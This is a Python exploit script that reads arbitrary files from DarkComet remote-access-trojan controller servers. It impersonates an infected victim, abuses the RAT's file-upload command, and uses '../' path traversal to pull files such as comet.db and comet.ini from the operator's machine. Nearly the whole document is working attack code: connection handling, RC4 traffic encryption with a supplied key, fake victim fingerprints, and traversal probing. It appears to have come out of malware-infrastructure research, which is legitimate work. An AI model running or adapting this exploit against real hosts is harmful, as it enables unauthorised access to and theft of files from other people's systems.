#!/usr/bin/python

__description__ = 'DarkComet Arbitrary File Read \nCredits to @sdenbow and @hectohertz for the discovery and initial script.'
__author__ = 'Kevin Breen http://malwareconfig.com'
__version__ = '0.2'
__date__ = '2015/06/03'

import os
import sys
import uuid
import random
import socket
import struct
from optparse import OptionParser
from Crypto.Cipher import ARC4

##
# Just Colours
##

def color(text, color_code):
    if sys.platform == "win32" and os.getenv("TERM") != "xterm":
        return text
    return "\x1b[%dm%s\x1b[0m" % (color_code, text)

def black(text):
    return color(text, 30)

def red(text):
    return color(text, 31)

def green(text):
    return color(text, 32)

def yellow(text):
    return color(text, 33)

def blue(text):
    return color(text, 34)

def magenta(text):
    return color(text, 35)

def cyan(text):
    return color(text, 36)

def white(text):
    return color(text, 37)

def bold(text):
    return color(text, 1)

##
# Crypto
##


def encrypt_traffic(text):
    cipher = ARC4.new(enc_key)
    return cipher.encrypt(text).encode('hex').upper()
    
def decrypt_traffic(text):
    new_text = text.decode('hex')
    cipher = ARC4.new(enc_key)
    return cipher.decrypt(new_text).upper()

##
# Connections
##

def new_conn():
    conn = socket.socket(socket.AF_INET)
    conn.settimeout(5)
    conn.connect((dc_host, dc_port))
    return conn

def get_data(dc_conn):
    data = decrypt_traffic(dc_conn.recv(1024))
    return data
    
def send_data(dc_conn, text):
    data = encrypt_traffic(text)
    dc_conn.send(data)
    
# Create a connection string
def unique_connection(port):
    campaign_name = 'Guest16'
    int_ip = random.choice(['192.168.', '172.16.', '10.1.'])
    int_ip += ".".join(map(str, (random.randint(1,254) for _ in range(2))))
    ext_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
    ram = random.randint(22,85)
    username = random.choice(['John', 'Peter', 'Flash', 'Bruce', 'Picard', 'Satan', 'Mal', 'Sarah', 'Emma', 'Jessica', 'Office'])
    hostname = '{0}s-PC'.format(username)
    idle = random.randint(0,5000)
    country = random.choice(['English (United States) US', 'ENGLISH (UNITED KINGDOM) GB'])
    country_code = country[-2:]
    os_value = random.choice(['Windows 7 Service Pack 1 [7601] 32 bit', 'Windows 7 Service Pack 1 [7601] 64 bit', 'Windows XP Service Pack 3 [2600] 32 bit', 'Windows Server 2003 Service Pack 2 [3790] 32 bit', 'Unknow [9200] 64 bit'])
    active_window = 'C:\Windows\iexplore.exe'
    conn_string = 'infoes{0}|{1} / [{2}] : {3}|{4} / {5}|2495609|{6}S|{7} ( C:\ )|- (LIMITED)||{8}|{9}|{10}|{11}%|{12} /  -- |22/05/2015 AT 17:16:23|5.3.0'.format(campaign_name, ext_ip, int_ip, port, hostname, username, idle, os_value, country_code, active_window, str(uuid.uuid4()), ram, country)
    return conn_string

##
# Commands
##
    
def init(dc_conn):
    send_data(dc_conn, "SERVER")
    get_data(dc_conn)
    send_data(dc_conn, unique_connection(dc_port))
    
def quickup(remote_path, local_path):
    # Open output file
    with open(local_path, 'a') as outfile:
        s = new_conn()
        id_type = get_data(s)
        cmd = "QUICKUP111|" + remote_path + "|UPLOADEXEC"
        send_data(s, cmd)
        # This is the first A.C
        s.recv(1024)
        # Send Response
        s.send("A")
        # This is the file size
        try:
            file_size = s.recv(1024)
        except socket.error as e:
            print red("  [-] File Not Found, closing Connection")
            s.close()
            print red("[+] Connection Closed")
            sys.exit()
        
        print cyan("  [-] Found File: Size {0} bytes".format(file_size))
        # send response.
        s.send("A")
        counter = 0
        print green("    [-] Saving Remote File to Local File {0}".format(local_path))
        
        while True:
            try:
                data = s.recv(1024)
                if not data:
                    break
                outfile.write(data)
                s.send('A')
            except socket.error as e:
                print red("  [!] Transfer Interrupted: {0}".format(e))
                break
        print cyan("  [-] Transfer Complete")
        s.close()

def path_test():
    attempts = 0
    test_path = ''
    found_path = False
    while not found_path and attempts < 10:
        try:
            s = new_conn()
            id_type = get_data(s)
            print cyan("  [-] Testing {0}".format(test_path))
            cmd = "QUICKUP111|" + test_path + "ntuser.ini|UPLOADEXEC"
            send_data(s, cmd)
            # This is the first A.C
            s.recv(1024)
            # Send Response
            s.send("A")
            # This is the file size
            file_size = s.recv(1024)
            if file_size:
                return test_path
        except Exception as e:
            test_path += '../'
            s.close()
            attempts += 1
    return test_path

##
# Starts Here
##

def main(remote_file, local_file):
    # Open A Socket
    print green("[+] Opening Socket to {0} on port {1}".format(dc_host, dc_port))
    try:
        dc_conn = new_conn()
    except socket.error as e:
        print red("[!] Connection Failed: {0}".format(e))
        return False
    
    # Confirm DarkComet
    id_type = get_data(dc_conn)
    
    # If we have a DC Banner continue else pass
    if id_type != 'IDTYPE':
        print red("[!] Not DarkComet or incorrect password")
        print red("  [*] Banner Reads {0}".format(encrypt_traffic(id_type)))
        return False

    print green("[+] Connecting to DarkComet Client")
    
    # Connect to DC Client
    init(dc_conn)

    # Now we have a connection lets grab a file. 

    # If its in the DC Folder
    if remote_file in ['comet.db','comet.ini']:
        remote_file = remote_file
    # If i want to declare a path
    elif remote_file.startswith('#'):
        remote_file = remote_file[1:]
    # Else use a relative path from users root
    else:
        print cyan("[+] Searching for User Root")
        user_root = path_test()
        if user_root:
            print green("  [-] Found User Root at {0}".format(user_root))
        else:
            print red("  [-] Unable to find User Root")
            return
        remote_file = user_root + remote_file
        
    # Once we have the correct path get the file.
    
    print cyan("  [-] Requesting Remote File {0}".format(remote_file))
    quickup(remote_file, local_file)
    print red("[+] Closing Connection")
    dc_conn.close()
    
if __name__ == "__main__":
    parser = OptionParser(usage='usage: %prog -H -p -k <password> remotefile localfile\n' + __description__, version='%prog ' + __version__)
    parser.add_option("-H", dest="dst_host", help="Destination Host")
    parser.add_option("-p", dest="dst_port", help="Destination Port")
    parser.add_option("-k", dest="enc_key", help="Encryption Key")
    
    (options, args) = parser.parse_args()
    # If we dont have args quit with help page
    if len(args) > 0:
        pass
    else:
        parser.print_help()
        sys.exit()
    if options.dst_host and options.dst_port and options.enc_key:
        # Set globals just to make it easy
        global dst_host, dst_port, enc_key
        dc_host, dc_port, enc_key = options.dst_host, int(options.dst_port), options.enc_key
        
        # Check for existing file
        if os.path.exists(args[1]):
            print red("[!] Local File {0} already exists".format(args[1]))
            sys.exit()
            
        # Run
        main(args[0], args[1])
    else:
        sys.exit()
    
